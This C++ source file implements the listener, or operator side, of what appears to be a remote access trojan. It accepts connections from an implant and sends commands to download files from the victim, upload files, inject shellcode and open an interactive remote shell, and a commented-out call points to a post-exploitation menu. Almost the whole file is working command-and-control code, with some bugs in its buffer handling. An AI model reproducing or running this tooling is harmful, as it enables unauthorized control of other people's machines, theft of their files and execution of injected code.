#include "listener.h"
#include "menus.h"
#include <fstream>
using namespace std;

void sigchld_handler(int s)
{
	(void)s; // quiet unused variable warning

	// waitpid() might overwrite errno, so we save and restore it:
	int saved_errno = errno;

	while(waitpid(-1, NULL, WNOHANG) > 0);

	errno = saved_errno;
}

void *get_in_addr(struct sockaddr *sa)
{
	if (sa->sa_family == AF_INET) {
		return &(((struct sockaddr_in*)sa)->sin_addr);
	}

	return &(((struct sockaddr_in6*)sa)->sin6_addr);
}
listener::listener(int port){
	this->port = port;
	string portString = to_string(port);
	const char* PORT= portString.c_str();
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE; // use my IP

	if ((rv = getaddrinfo(NULL, PORT, &hints, &servinfo)) != 0) {
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
		return;
	}

	// loop through all the results and bind to the first we can
	for(p = servinfo; p != NULL; p = p->ai_next) {
		if ((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
			perror("server: socket");
			continue;
		}

		if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) {
			perror("setsockopt");
			return;
		}

		if (bind(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
			close(sockfd);
			perror("server: bind");
			continue;
		}
		break;
	}

	freeaddrinfo(servinfo); // all done with this structure

	if (p == NULL)  {
		fprintf(stderr, "server: failed to bind\n");
		return;
	}

	if (listen(sockfd, 1) == -1) {
		perror("listen");
		return;
	}

	sa.sa_handler = sigchld_handler; // reap all dead processes
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = SA_RESTART;
	if (sigaction(SIGCHLD, &sa, NULL) == -1) {
		perror("sigaction");
		return;
	}

}
void listener::test(){
	printf("server: waiting for connections...\n");
	sin_size = sizeof their_addr;
	new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size);
	if (new_fd == -1) {
		cout<<"accepted error"<<endl;
	}
	cout<<"got connection"<<endl;
	status = 1;
	inet_ntop(their_addr.ss_family, get_in_addr((struct sockaddr *)&their_addr), s, sizeof s);
	//postExploitMenu(this);

	//close(sockfd);
	//close(new_fd);
}

int listener::downloadFile(string r_path, string l_path) {
	printf("Download File...\n");
	ofstream out(l_path, ios::binary);

	string cmd = "download:" + r_path;
	send(new_fd, cmd.c_str(), cmd.length(), 0);
			
	char *recv_code = new char[1024];
	int b = recv(new_fd, recv_code, 1024, 0);

	if (recv_code[0] == '1') {
		printf("%s", recv_code);
		return 1;
	}

	while (out.is_open()) {
		char *recvbuf = new char[1024];
		int bytes = recv(new_fd, recvbuf, 1024, 0);

		int len_recv = strlen(recvbuf);
		printf("Length of recvbuf is %d\n", len_recv);
		if (len_recv > 0) {
			printf("Writing to file\n");
			out.write(recvbuf, len_recv);
			memset(recvbuf, '\0', 1024);
		} else {
			printf("Closing file error: %s\n", strerror(errno));
			out.close();
			break;
		}

		if (len_recv < 1024) {
			printf("Last section of file\n");
			out.close();
			break;
		}
	}
	printf("Finished Downloading!\n");
	return 0;
}

int listener::uploadFile(string l_path, string r_path) {
	printf("Uploading File...\n");
	std::streampos filesize = 0;
	ifstream in(l_path, std::ios::binary);

	if (!in.is_open()) {
		printf("Error Opening File");
		return 1;
	}

	char* sendbuf = new char[1024];
	int sendbuflen = 1024;
	memset(sendbuf, '\0', sendbuflen);

	string cmd = "upload:" + r_path;
	send(new_fd, cmd.c_str(), cmd.length(), 0);

	while (in.is_open()) {
		printf("File is open\n");
		in.read(sendbuf, sendbuflen);
		if (in.eof()) {
			printf("End of file\n");
			send(new_fd, sendbuf, sendbuflen, 0);
			memset(sendbuf, '\0', sendbuflen);
			in.close();
		} else {
			printf("Sending file\n");
			send(new_fd, sendbuf, sendbuflen, 0);
			memset(sendbuf, '\0', sendbuflen);
		}
	}
	printf("Finished Uploading!\n");
	return 0;
}

int listener::injectShellcode(string l_path) {
	printf("Injecting Shellcode...\n");
	std::streampos filesize = 0;
	ifstream in(l_path, std::ios::binary);
	char* sendbuf = new char[1024];
	int sendbuflen = 1024;
	memset(sendbuf, '\0', sendbuflen);
	
	string cmd = "shellcode:";
	send(new_fd, cmd.c_str(), cmd.length(), 0);

	while (in.is_open()) {
		printf("File is open\n");
		in.read(sendbuf, sendbuflen);
		if (in.eof()) {
			printf("End of file\n");
			send(new_fd, sendbuf, sendbuflen, 0);
			memset(sendbuf, '\0', sendbuflen);
			in.close();
		} else {
			printf("Sending file\n");
			send(new_fd, sendbuf, sendbuflen, 0);
			memset(sendbuf, '\0', sendbuflen);
		}
	}
	printf("Finished Uploading Shellcode!\n");
	return 0;
}

int listener::dropIntoShell() {
	printf("Dropping into Shell...\n");

	char* sendbuf = new char[2048];
	char* recvbuf = new char[2048];
	int buflen = 2048;
	memset(sendbuf, '\0', buflen);
	memset(recvbuf, '\0', buflen);

	string cmd = "dropshell:";
	send(new_fd, cmd.c_str(), cmd.length(), 0);

	printf("Dropped into shell!\n");

	//cmd = "whoami";
	//send(new_fd, cmd.c_str(), cmd.length(), 0);

	int bytes;
	int byte_recv;
	int n;

	do {

		byte_recv = recv(new_fd, recvbuf, buflen, 0);
		cout << recvbuf;	

		string data = "whoami";
		//getline(cin, data);
		//strcpy(sendbuf, data.c_str());
		n = 0;
		while ((sendbuf[n++] = getchar()) != '\n');
		//printf("Sending command\n");
		bytes = send(new_fd, sendbuf, sizeof(sendbuf), 0);
		//bytes = send(new_fd, data.c_str(), sizeof(data.c_str()), 0);

		memset(recvbuf, '\0', buflen);
		memset(sendbuf, '\0', buflen);
	} while (byte_recv > 0);

	return 0;
}

string listener::print(){
	string out = "port: "+to_string(port)+" "+to_string(status);
	return out;
}

void
listener::setID(int pid){
	id = pid; 
}
